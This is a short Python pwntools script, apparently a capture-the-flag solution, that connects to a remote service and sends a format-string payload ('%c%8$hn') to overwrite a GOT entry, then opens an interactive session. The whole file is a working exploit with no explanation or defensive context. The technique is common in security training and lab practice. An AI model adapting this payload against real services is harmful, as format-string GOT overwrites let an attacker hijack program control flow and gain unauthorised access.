from pwn import *
#context.log_level='debug'
got=0x000000000601028
#p=process("./main")
p=remote("10.21.13.190",2699)
#gdb.attach(p)
payload="%{}c%8$hn".format(0x2216).ljust(0x10,'\x00')+p64(got)
payload=payload[:-5]
log.info((payload))
log.info(len(payload))
p.sendafter(".\n",payload)
p.interactive()
